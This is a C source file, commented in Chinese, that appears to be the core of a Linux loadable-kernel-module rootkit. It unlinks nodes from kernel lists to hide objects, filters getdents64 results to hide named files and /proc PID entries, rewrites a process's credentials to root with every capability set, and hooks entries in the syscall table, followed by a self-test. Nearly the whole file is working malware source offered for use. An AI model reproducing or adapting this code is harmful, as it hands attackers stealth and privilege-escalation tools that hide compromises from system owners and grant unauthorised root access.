/* 23_lkm — 内核态操作核心实现
 *
 * 本文件不含任何内核头文件、不引用任何内核符号。
 * 全部操作经 lkm_mem 回调完成，因此在 LKM 内 / 用户态测试 / kcore 上
 * 跑的是同一份代码。
 */

#include <string.h>
#include <stdlib.h>

#include "lkm.h"

const char *lkm_strerror(int rc)
{
    switch (rc) {
    case LKM_OK:            return "ok";
    case LKM_ERR_PARAM:     return "invalid parameter";
    case LKM_ERR_IO:        return "memory read/write failed";
    case LKM_ERR_CORRUPT:   return "target structure is inconsistent";
    case LKM_ERR_NOTFOUND:  return "node is not on the list";
    case LKM_ERR_FOREIGN:   return "slot holds a third-party pointer, refusing";
    case LKM_ERR_ALREADY:   return "already in the requested state";
    case LKM_ERR_LAYOUT:    return "layout not probed at runtime, refusing to guess";
    case LKM_ERR_RANGE:     return "access outside the readable/writable region";
    default:                return "unknown error";
    }
}

/* ====================== 小端原语读写 ====================== */

static void put_u32(void *p, uint32_t v)
{
    unsigned char *q = (unsigned char *)p;
    q[0] = (unsigned char)(v & 0xff);
    q[1] = (unsigned char)((v >> 8) & 0xff);
    q[2] = (unsigned char)((v >> 16) & 0xff);
    q[3] = (unsigned char)((v >> 24) & 0xff);
}

static void put_u64(void *p, uint64_t v)
{
    unsigned char *q = (unsigned char *)p;
    for (int i = 0; i < 8; i++)
        q[i] = (unsigned char)((v >> (8 * i)) & 0xff);
}

static uint64_t get_u64(const void *p)
{
    const unsigned char *q = (const unsigned char *)p;
    uint64_t v = 0;
    for (int i = 0; i < 8; i++)
        v |= (uint64_t)q[i] << (8 * i);
    return v;
}

static int rd_u64(lkm_mem *m, uint64_t va, uint64_t *out)
{
    unsigned char b[8];
    int rc = m->rd(m->ud, va, b, sizeof(b));
    if (rc != LKM_OK)
        return rc;
    *out = get_u64(b);
    return LKM_OK;
}

static int wr_u64(lkm_mem *m, uint64_t va, uint64_t v)
{
    unsigned char b[8];
    put_u64(b, v);
    return m->wr(m->ud, va, b, sizeof(b));
}

static int wr_u32(lkm_mem *m, uint64_t va, uint32_t v)
{
    unsigned char b[4];
    put_u32(b, v);
    return m->wr(m->ud, va, b, sizeof(b));
}

/* ======================== 双向链表摘除 ======================== */

int lkm_unlink_node(lkm_mem *m, uint64_t node,
                    size_t next_off, size_t prev_off, unsigned flags)
{
    uint64_t nxt, prv, back;

    if (!m || !m->rd || !m->wr)
        return LKM_ERR_PARAM;
    if (next_off == prev_off)
        return LKM_ERR_PARAM;

    int rc = rd_u64(m, node + (uint64_t)next_off, &nxt);
    if (rc != LKM_OK)
        return rc;
    rc = rd_u64(m, node + (uint64_t)prev_off, &prv);
    if (rc != LKM_OK)
        return rc;

    /* 自环 = list_del_init 之后的形态 = 已经不在链表上。
     * 幂等返回 NOTFOUND，而不是把自环当成有效邻居继续写。 */
    if (nxt == node && prv == node)
        return LKM_ERR_NOTFOUND;
    if (nxt == 0 || prv == 0)
        return LKM_ERR_CORRUPT;

    /* 互指校验：任何一侧不成立都整体放弃，一个字节都不写 */
    rc = rd_u64(m, nxt + (uint64_t)prev_off, &back);
    if (rc != LKM_OK)
        return rc;
    if (back != node)
        return LKM_ERR_CORRUPT;

    rc = rd_u64(m, prv + (uint64_t)next_off, &back);
    if (rc != LKM_OK)
        return rc;
    if (back != node)
        return LKM_ERR_CORRUPT;

    rc = wr_u64(m, nxt + (uint64_t)prev_off, prv);
    if (rc != LKM_OK)
        return rc;
    rc = wr_u64(m, prv + (uint64_t)next_off, nxt);
    if (rc != LKM_OK)
        return rc;

    if (!(flags & LKM_UNLINK_KEEP)) {
        rc = wr_u64(m, node + (uint64_t)next_off, node);
        if (rc != LKM_OK)
            return rc;
        rc = wr_u64(m, node + (uint64_t)prev_off, node);
        if (rc != LKM_OK)
            return rc;
    }
    return LKM_OK;
}

/* ==================== getdents / getdents64 过滤 ==================== */

#define DIRENT64_HDR 19

int lkm_dirent_filter(void *buf, size_t len,
                      lkm_hide_cb cb, void *ud,
                      size_t *out_len, size_t *out_removed)
{
    if (!buf || !cb)
        return LKM_ERR_PARAM;
    if (len == 0) {
        if (out_len)
            *out_len = 0;
        if (out_removed)
            *out_removed = 0;
        return LKM_OK;
    }

    unsigned char *p = (unsigned char *)buf;
    size_t pos = 0, removed = 0;

    while (pos < len) {
        if (len - pos < DIRENT64_HDR)
            return LKM_ERR_CORRUPT;

        uint16_t reclen = (uint16_t)(p[pos + 16] | ((uint16_t)p[pos + 17] << 8));
        if (reclen < DIRENT64_HDR)
            return LKM_ERR_CORRUPT;
        if ((size_t)reclen > len - pos)
            return LKM_ERR_CORRUPT;

        /* 名字在交给回调前先拷进定长栈缓冲并显式补 NUL。
         *
         * 不能直接把 p+pos+19 交给回调：d_name 的 NUL 由内核保证，
         * 但我们面对的是一段来自内核、可能被第三方并发改写的缓冲区，
         * 缺 NUL 时回调会一路读到缓冲区之外。
         * 拷贝边界严格取 min(nmax, 255)，绝不越出本条目。 */
        size_t nmax = (size_t)reclen - DIRENT64_HDR;
        char nm[256];
        size_t ncopy = nmax < sizeof(nm) - 1 ? nmax : sizeof(nm) - 1;
        memcpy(nm, p + pos + DIRENT64_HDR, ncopy);
        nm[ncopy] = '\0';

        if (!cb(nm, get_u64(p + pos), p[pos + 18], ud)) {
            pos += reclen;
            continue;
        }

        size_t tail = len - (pos + reclen);
        if (tail)
            memmove(p + pos, p + pos + reclen, tail);
        len -= reclen;
        removed++;
        /* pos 不前进：后续条目已经前移到当前位置 */
    }

    if (out_len)
        *out_len = len;
    if (out_removed)
        *out_removed = removed;
    return LKM_OK;
}

/* 回调拿到的 name 由 lkm_dirent_filter 保证 NUL 结尾且不超过 255 字节，
 * 因此这里可以直接用逐字符比较，无需带长度。 */
int lkm_dirent_hide_name(const char *name, uint64_t ino, uint8_t type, void *ud)
{
    (void)ino;
    (void)type;
    if (!name || !ud)
        return 0;
    const char *want = (const char *)ud;
    size_t i = 0;
    for (; name[i] != '\0'; i++) {
        if (want[i] == '\0')
            return 0;
        if (name[i] != want[i])
            return 0;
    }
    return want[i] == '\0';
}

int lkm_dirent_hide_pid(const char *name, uint64_t ino, uint8_t type, void *ud)
{
    (void)ino;
    (void)type;
    if (!name || !ud)
        return 0;

    uint64_t want = *(const uint64_t *)ud;
    uint64_t v = 0;
    size_t n = 0;
    for (; name[n] != '\0'; n++) {
        if (name[n] < '0' || name[n] > '9')
            return 0;               /* 含非数字 -> 不是 /proc/<pid> */
        if (n >= 20)
            return 0;               /* 超长 -> 不可能匹配，且防溢出 */
        v = v * 10u + (uint64_t)(name[n] - '0');
    }
    if (n == 0)
        return 0;                   /* 空名字 */
    /* 只认十进制规范写法：拒绝 "004242" 这类前导零形式。
     * /proc 下不会存在前导零目录名，若用数值相等去匹配，
     * 就有可能把与 pid 无关的条目一并藏掉。 */
    if (n > 1 && name[0] == '0')
        return 0;
    return v == want;
}

/* ========================== 凭据提升 ========================== */

/* kernel_cap_t = 2 × __u32 = 8 字节（64 个 capability 位）。
 * 探测到的 cap_full_mask 实测为 0x1ffffffffff（cap 0..40）。 */
#define LKM_CAP_FIELD_SIZE 8

int lkm_cred_layout_ok(const klayout_cred *L)
{
    if (!L)
        return LKM_ERR_PARAM;
    if (!L->probed)
        return LKM_ERR_LAYOUT;

    size_t ids[9];
    ids[0] = L->uid;   ids[1] = L->gid;   ids[2] = L->suid;
    ids[3] = L->sgid;  ids[4] = L->euid;  ids[5] = L->egid;
    ids[6] = L->fsuid; ids[7] = L->fsgid; ids[8] = L->securebits;

    size_t caps[5];
    caps[0] = L->cap_inheritable; caps[1] = L->cap_permitted;
    caps[2] = L->cap_effective;   caps[3] = L->cap_bset;
    caps[4] = L->cap_ambient;

    /* 任何待写偏移落在 usage 上都会把引用计数清零 -> 后续 put_cred 失衡
     * -> use-after-free。宁可拒绝提权，也不制造这种延迟崩溃。 */
    for (int i = 0; i < 9; i++)
        if (ids[i] == L->usage)
            return LKM_ERR_LAYOUT;
    for (int i = 0; i < 5; i++)
        if (caps[i] == L->usage)
            return LKM_ERR_LAYOUT;

    /* id 区必须两两不同（同一偏移被写两次说明探测串位） */
    for (int i = 0; i < 9; i++)
        for (int j = i + 1; j < 9; j++)
            if (ids[i] == ids[j])
                return LKM_ERR_LAYOUT;

    /* cap 区两两间隔必须不小于字段大小，否则会写穿到下一个字段 */
    for (int i = 0; i < 5; i++)
        for (int j = i + 1; j < 5; j++) {
            size_t d = caps[j] > caps[i] ? caps[j] - caps[i] : caps[i] - caps[j];
            if (d < LKM_CAP_FIELD_SIZE)
                return LKM_ERR_LAYOUT;
        }

    if (L->cap_full_mask == 0)
        return LKM_ERR_LAYOUT;

    return LKM_OK;
}

int lkm_cred_apply(lkm_mem *m, uint64_t cred, const klayout_cred *L)
{
    if (!m || !m->rd || !m->wr)
        return LKM_ERR_PARAM;

    int rc = lkm_cred_layout_ok(L);
    if (rc != LKM_OK)
        return rc;

    const size_t ids[8] = {
        L->uid, L->gid, L->suid, L->sgid,
        L->euid, L->egid, L->fsuid, L->fsgid
    };
    for (int i = 0; i < 8; i++) {
        rc = wr_u32(m, cred + (uint64_t)ids[i], 0);
        if (rc != LKM_OK)
            return rc;
    }

    rc = wr_u32(m, cred + (uint64_t)L->securebits, 0);
    if (rc != LKM_OK)
        return rc;

    const size_t caps[5] = {
        L->cap_inheritable, L->cap_permitted, L->cap_effective,
        L->cap_bset, L->cap_ambient
    };
    for (int i = 0; i < 5; i++) {
        rc = wr_u64(m, cred + (uint64_t)caps[i], L->cap_full_mask);
        if (rc != LKM_OK)
            return rc;
    }

    return LKM_OK;
}

/* ====================== syscall 表 hook 装卸 ====================== */

int lkm_hook_install(lkm_mem *m, uint64_t table, int nr,
                     uint64_t new_fn, uint64_t *orig)
{
    if (!m || !m->rd || !m->wr || nr < 0)
        return LKM_ERR_PARAM;

    uint64_t slot = table + (uint64_t)nr * 8u;
    uint64_t cur;
    int rc = rd_u64(m, slot, &cur);
    if (rc != LKM_OK)
        return rc;
    if (cur == 0)
        return LKM_ERR_CORRUPT;
    /* 已经是我们自己：再写一次会把 orig 丢掉（orig 已经是 our_fn），
     * 之后卸载就再也恢复不回原地址。 */
    if (cur == new_fn)
        return LKM_ERR_ALREADY;

    if (orig)
        *orig = cur;
    return wr_u64(m, slot, new_fn);
}

int lkm_hook_restore(lkm_mem *m, uint64_t table, int nr,
                     uint64_t cur_expected, uint64_t orig)
{
    if (!m || !m->rd || !m->wr || nr < 0)
        return LKM_ERR_PARAM;

    uint64_t slot = table + (uint64_t)nr * 8u;
    uint64_t cur;
    int rc = rd_u64(m, slot, &cur);
    if (rc != LKM_OK)
        return rc;

    if (cur == orig)
        return LKM_ERR_ALREADY;     /* 已经恢复，幂等 */
    if (cur != cur_expected)
        return LKM_ERR_FOREIGN;     /* 别人在之后又装了一层，不许盲写 */

    return wr_u64(m, slot, orig);
}

/* ========================== 自检 ========================== */

/* 自检用的极简平面内存：base..base+size 可读写，越界返回 RANGE。 */
typedef struct { unsigned char *p; uint64_t base; size_t size; } flat_mem;

static int flat_rd(void *ud, uint64_t va, void *buf, size_t n)
{
    flat_mem *f = (flat_mem *)ud;
    if (va < f->base || va - f->base > f->size || n > f->size - (va - f->base))
        return LKM_ERR_RANGE;
    memcpy(buf, f->p + (va - f->base), n);
    return LKM_OK;
}

static int flat_wr(void *ud, uint64_t va, const void *buf, size_t n)
{
    flat_mem *f = (flat_mem *)ud;
    if (va < f->base || va - f->base > f->size || n > f->size - (va - f->base))
        return LKM_ERR_RANGE;
    memcpy(f->p + (va - f->base), buf, n);
    return LKM_OK;
}

int lkm_selftest(void)
{
    /* 1) 三项循环链表：摘中间，遍历应只剩两项 */
    unsigned char arena[4096];
    memset(arena, 0, sizeof(arena));
    flat_mem f = { arena, 0x1000, sizeof(arena) };
    lkm_mem m = { flat_rd, flat_wr, &f };

    const uint64_t A = 0x1000, B = 0x1020, C = 0x1040;   /* list 在偏移 0 */
    put_u64(arena + (A - 0x1000) + 0, B);
    put_u64(arena + (A - 0x1000) + 8, C);
    put_u64(arena + (B - 0x1000) + 0, C);
    put_u64(arena + (B - 0x1000) + 8, A);
    put_u64(arena + (C - 0x1000) + 0, A);
    put_u64(arena + (C - 0x1000) + 8, B);

    if (lkm_unlink_node(&m, B, 0, 8, 0) != LKM_OK)
        return 1;
    uint64_t v;
    if (rd_u64(&m, A + 0, &v) != LKM_OK || v != C)
        return 2;
    if (rd_u64(&m, C + 8, &v) != LKM_OK || v != A)
        return 3;
    if (rd_u64(&m, B + 0, &v) != LKM_OK || v != B)
        return 4;
    if (lkm_unlink_node(&m, B, 0, 8, 0) != LKM_ERR_NOTFOUND)
        return 5;

    /* 2) dirent64 过滤 */
    unsigned char dbuf[512];
    size_t dlen = 0, off = 0;
    const char *names[3] = { "alpha", "target", "omega" };
    for (int i = 0; i < 3; i++) {
        size_t nl = strlen(names[i]) + 1;
        uint16_t rl = (uint16_t)(DIRENT64_HDR + nl);
        put_u64(dbuf + off, (uint64_t)(i + 1));        /* d_ino */
        put_u64(dbuf + off + 8, (uint64_t)(off + rl)); /* d_off */
        dbuf[off + 16] = (unsigned char)(rl & 0xff);   /* d_reclen 低字节 */
        dbuf[off + 17] = (unsigned char)((rl >> 8) & 0xff);
        dbuf[off + 18] = 8;                            /* d_type = DT_REG */
        memcpy(dbuf + off + DIRENT64_HDR, names[i], nl);
        off += rl;
        dlen += rl;
    }
    size_t nl2 = 0, rem = 0;
    if (lkm_dirent_filter(dbuf, dlen, lkm_dirent_hide_name, (void *)"target",
                          &nl2, &rem) != LKM_OK)
        return 6;
    if (rem != 1)
        return 7;
    if (nl2 != dlen - (DIRENT64_HDR + 7))
        return 8;

    /* 过滤后重新遍历必须仍是合法序列 */
    size_t p2 = 0, seen = 0;
    while (p2 < nl2) {
        uint16_t rl = (uint16_t)(dbuf[p2 + 16] | ((uint16_t)dbuf[p2 + 17] << 8));
        if (rl < DIRENT64_HDR || (size_t)rl > nl2 - p2)
            return 9;
        if (strcmp((const char *)(dbuf + p2 + DIRENT64_HDR), "target") == 0)
            return 10;
        seen++;
        p2 += rl;
    }
    if (seen != 2)
        return 11;

    /* 3) cred 布局校验：未探测必须被拒 */
    klayout_cred L;
    memset(&L, 0, sizeof(L));
    if (lkm_cred_layout_ok(&L) != LKM_ERR_LAYOUT)
        return 12;

    return 0;
}
